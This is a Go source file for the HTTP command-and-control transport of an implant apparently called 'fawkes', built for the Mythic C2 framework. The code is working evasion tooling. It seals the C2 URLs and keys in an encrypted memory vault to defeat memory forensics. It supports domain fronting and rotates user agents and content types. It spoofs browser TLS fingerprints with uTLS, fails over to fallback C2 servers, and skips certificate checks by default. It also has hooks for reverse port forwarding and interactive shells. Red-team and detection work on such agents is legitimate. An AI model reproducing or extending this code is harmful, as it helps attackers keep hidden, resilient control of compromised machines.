package http

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync/atomic"
	"time"

	"fawkes/pkg/resilience"
	"fawkes/pkg/structs"
)

// configVault holds AES-256-GCM encrypted C2 configuration. Sensitive fields
// (C2 URL, encryption key, user agent, endpoints) are stored encrypted and
// only decrypted into local variables for the duration of each HTTP operation.
// This reduces the plaintext exposure window from "entire process lifetime"
// to "single HTTP request duration" (~milliseconds).
type configVault struct {
	key  []byte // AES-256-GCM key (random, generated at SealConfig)
	blob []byte // Encrypted JSON of sensitiveConfig
}

// sensitiveConfig holds the C2 configuration fields that should not persist
// as plaintext in memory. These reveal C2 infrastructure and enable traffic decryption.
type sensitiveConfig struct {
	BaseURL       string            `json:"b"`
	FallbackURLs  []string          `json:"f,omitempty"`
	UserAgent     string            `json:"a"`
	UserAgentPool []string          `json:"ap,omitempty"`
	EncryptionKey string            `json:"k"`
	CallbackUUID  string            `json:"c"`
	HostHeader    string            `json:"h"`
	GetEndpoint   string            `json:"g"`
	PostEndpoint  string            `json:"p"`
	CustomHeaders map[string]string `json:"x,omitempty"`
	ContentTypes  []string          `json:"ct,omitempty"`
}

// HTTPProfile handles HTTP communication with Mythic
type HTTPProfile struct {
	BaseURL       string
	UserAgent     string
	EncryptionKey string
	MaxRetries    int
	SleepInterval int
	Jitter        int
	Debug         bool
	GetEndpoint   string
	PostEndpoint  string
	HostHeader    string            // Override Host header for domain fronting
	CustomHeaders map[string]string // Additional HTTP headers from C2 profile
	ContentTypes  []string          // Content-Type rotation pool for request body
	UserAgentPool []string          // User-Agent rotation pool (if set, overrides single UserAgent)
	client        *http.Client
	CallbackUUID  string        // Store callback UUID from initial checkin
	ctIndex       atomic.Uint32 // Round-robin index for Content-Type rotation
	uaIndex       atomic.Uint32 // Round-robin index for User-Agent rotation

	// Fallback C2 URLs for automatic failover when primary is unreachable.
	FallbackURLs []string
	// activeURLIdx tracks which URL in the list is currently being used.
	// 0 = primary (BaseURL), 1+ = fallback URLs. Updated on failover.
	// Accessed atomically — makeRequest may be called concurrently from
	// multiple PostResponse goroutines and the GetTasking loop.
	activeURLIdx atomic.Int32

	// Domain health tracker — tracks per-URL health for intelligent failover.
	// Skips known-unhealthy fallback URLs and periodically retries them.
	tracker *resilience.DomainTracker

	// Config vault — encrypted storage for sensitive C2 fields.
	// When active, the struct fields above are zeroed and all access
	// goes through getConfig() which decrypts on demand.
	vault *configVault

	// P2P delegate hooks — set by main.go when TCP P2P children are supported.
	// GetDelegatesOnly returns only pending delegate messages (no edges). Used by GetTasking.
	// GetDelegatesAndEdges returns delegates AND edge notifications. Used by PostResponse.
	// HandleDelegates routes incoming delegate messages from Mythic to the appropriate children.
	GetDelegatesOnly     func() []structs.DelegateMessage
	GetDelegatesAndEdges func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
	HandleDelegates      func(delegates []structs.DelegateMessage)

	// Rpfwd hooks — set by main.go for reverse port forward message routing.
	GetRpfwdOutbound func() []structs.SocksMsg
	HandleRpfwd      func(msgs []structs.SocksMsg)

	// Interactive hooks — set by main.go for PTY/terminal bidirectional streaming.
	GetInteractiveOutbound func() []structs.InteractiveMsg
	HandleInteractive      func(msgs []structs.InteractiveMsg)
}

// NewHTTPProfile creates a new HTTP profile
func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify, tlsFingerprint string, fallbackURLs, contentTypes []string, recoverySeconds int) *HTTPProfile {
	profile := &HTTPProfile{
		BaseURL:       baseURL,
		UserAgent:     userAgent,
		EncryptionKey: encryptionKey,
		MaxRetries:    maxRetries,
		SleepInterval: sleepInterval,
		Jitter:        jitter,
		Debug:         debug,
		GetEndpoint:   getEndpoint,
		PostEndpoint:  postEndpoint,
		HostHeader:    hostHeader,
		FallbackURLs:  fallbackURLs,
		ContentTypes:  contentTypes,
		tracker:       resilience.NewTracker(1+len(fallbackURLs), 3, recoverySeconds),
	}

	// Configure TLS based on verification mode
	tlsConfig := buildTLSConfig(tlsVerify)

	// Configure transport with optional proxy
	transport := &http.Transport{
		TLSClientConfig:     tlsConfig,
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 5,
		IdleConnTimeout:     90 * time.Second,
	}

	// Configure proxy if specified
	if proxyURL != "" {
		if proxyU, err := url.Parse(proxyURL); err == nil {
			transport.Proxy = http.ProxyURL(proxyU)
		}
	}

	// If a TLS fingerprint is specified (not "go" or empty), use uTLS to spoof
	// the TLS ClientHello. This replaces Go's default TLS stack with uTLS for
	// HTTPS connections, producing a browser-matching JA3 fingerprint.
	if helloID, ok := tlsFingerprintID(tlsFingerprint); ok {
		transport.DialTLSContext = buildUTLSTransportDialer(helloID, tlsConfig)
		// Clear TLSClientConfig — uTLS handles TLS now, and having both
		// causes http.Transport to skip DialTLSContext for HTTPS.
		transport.TLSClientConfig = nil
	}

	profile.client = &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
	}

	return profile
}

// SetTimeout configures the HTTP client timeout in seconds.
func (h *HTTPProfile) SetTimeout(seconds int) {
	h.client.Timeout = time.Duration(seconds) * time.Second
}

// SealConfig encrypts all sensitive C2 configuration fields into an AES-256-GCM
// vault and zeros the plaintext struct fields. After sealing, fields are only
// decrypted on-demand for the duration of each HTTP operation. This reduces the
// memory forensics exposure window from the entire process lifetime to individual
// HTTP request durations (~milliseconds).
func (h *HTTPProfile) SealConfig() error {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("config vault key generation failed: %w", err)
	}

	cfg := &sensitiveConfig{
		BaseURL:       h.BaseURL,
		FallbackURLs:  h.FallbackURLs,
		UserAgent:     h.UserAgent,
		UserAgentPool: h.UserAgentPool,
		EncryptionKey: h.EncryptionKey,
		CallbackUUID:  h.CallbackUUID,
		HostHeader:    h.HostHeader,
		GetEndpoint:   h.GetEndpoint,
		PostEndpoint:  h.PostEndpoint,
		CustomHeaders: h.CustomHeaders,
		ContentTypes:  h.ContentTypes,
	}

	plaintext, err := json.Marshal(cfg)
	if err != nil {
		vaultZeroBytes(key)
		return fmt.Errorf("config vault marshal failed: %w", err)
	}

	blob := vaultEncrypt(key, plaintext)
	vaultZeroBytes(plaintext)
	if blob == nil {
		vaultZeroBytes(key)
		return fmt.Errorf("config vault encryption failed")
	}

	h.vault = &configVault{key: key, blob: blob}

	// Zero plaintext struct fields — all access now goes through the vault
	h.BaseURL = ""
	h.FallbackURLs = nil
	h.UserAgent = ""
	h.EncryptionKey = ""
	h.CallbackUUID = ""
	h.HostHeader = ""
	h.GetEndpoint = ""
	h.PostEndpoint = ""
	h.CustomHeaders = nil
	h.ContentTypes = nil
	h.UserAgentPool = nil

	return nil
}

// getConfig returns the current C2 configuration. If the vault is active,
// decrypts and returns the config from the vault. Otherwise returns the
// plaintext struct fields directly. Each call creates an independent copy —
// safe for concurrent use from multiple goroutines.
func (h *HTTPProfile) getConfig() *sensitiveConfig {
	if h.vault == nil {
		return &sensitiveConfig{
			BaseURL:       h.BaseURL,
			FallbackURLs:  h.FallbackURLs,
			UserAgent:     h.UserAgent,
			UserAgentPool: h.UserAgentPool,
			EncryptionKey: h.EncryptionKey,
			CallbackUUID:  h.CallbackUUID,
			HostHeader:    h.HostHeader,
			GetEndpoint:   h.GetEndpoint,
			PostEndpoint:  h.PostEndpoint,
			CustomHeaders: h.CustomHeaders,
			ContentTypes:  h.ContentTypes,
		}
	}

	plaintext := vaultDecrypt(h.vault.key, h.vault.blob)
	if plaintext == nil {
		return nil
	}

	var cfg sensitiveConfig
	if err := json.Unmarshal(plaintext, &cfg); err != nil {
		vaultZeroBytes(plaintext)
		return nil
	}
	vaultZeroBytes(plaintext)
	return &cfg
}

// IsSealed returns true if the config vault is active (fields are encrypted).
func (h *HTTPProfile) IsSealed() bool {
	return h.vault != nil
}

// UpdateCallbackUUID updates the callback UUID in the vault (or struct field
// if vault is not active). Called after Checkin to store the server-assigned UUID.
func (h *HTTPProfile) UpdateCallbackUUID(uuid string) {
	if h.vault != nil {
		cfg := h.getConfig()
		if cfg != nil {
			cfg.CallbackUUID = uuid
			plaintext, err := json.Marshal(cfg)
			if err == nil {
				newBlob := vaultEncrypt(h.vault.key, plaintext)
				vaultZeroBytes(plaintext)
				if newBlob != nil {
					vaultZeroBytes(h.vault.blob)
					h.vault.blob = newBlob
				}
			}
		}
		return
	}
	h.CallbackUUID = uuid
}

// buildTLSConfig creates a TLS configuration based on the verification mode.
// Modes: "none" (skip verification), "system-ca" (OS trust store), "pinned:<hex-sha256>" (cert pin)
func buildTLSConfig(tlsVerify string) *tls.Config {
	switch {
	case tlsVerify == "system-ca":
		// Use the operating system's certificate trust store
		return &tls.Config{
			InsecureSkipVerify: false,
			MinVersion:         tls.VersionTLS12,
		}
	case strings.HasPrefix(tlsVerify, "pinned:"):
		// Pin to a specific certificate SHA-256 fingerprint
		fingerprint := strings.TrimPrefix(tlsVerify, "pinned:")
		expectedHash, err := hex.DecodeString(fingerprint)
		if err != nil || len(expectedHash) != 32 {
			// Invalid fingerprint — fall back to skip verify to avoid bricking the agent
			return &tls.Config{InsecureSkipVerify: true}
		}
		return &tls.Config{
			InsecureSkipVerify: true, // We do our own verification in VerifyPeerCertificate
			MinVersion:         tls.VersionTLS12,
			VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
				if len(rawCerts) == 0 {
					return fmt.Errorf("no certificates presented")
				}
				// Hash the leaf certificate's raw DER bytes
				hash := sha256.Sum256(rawCerts[0])
				if !bytes.Equal(hash[:], expectedHash) {
					return fmt.Errorf("certificate fingerprint mismatch")
				}
				return nil
			},
		}
	default:
		// "none" or unrecognized — skip verification (backward compatible default)
		return &tls.Config{InsecureSkipVerify: true}
	}
}

// GetCallbackUUID returns the callback UUID assigned by Mythic after checkin.
// Reads from the vault if config is sealed.
func (h *HTTPProfile) GetCallbackUUID() string {
	if h.vault != nil {
		if cfg := h.getConfig(); cfg != nil {
			return cfg.CallbackUUID
		}
	}
	return h.CallbackUUID
}

// getActiveUUID returns the callback UUID if available, otherwise the payload UUID.
// Reads from the provided config to avoid accessing zeroed struct fields.
func (h *HTTPProfile) getActiveUUID(agent *structs.Agent, cfg *sensitiveConfig) string {
	if cfg != nil && cfg.CallbackUUID != "" {
		return cfg.CallbackUUID
	}
	if h.CallbackUUID != "" {
		return h.CallbackUUID
	}
	return agent.PayloadUUID
}
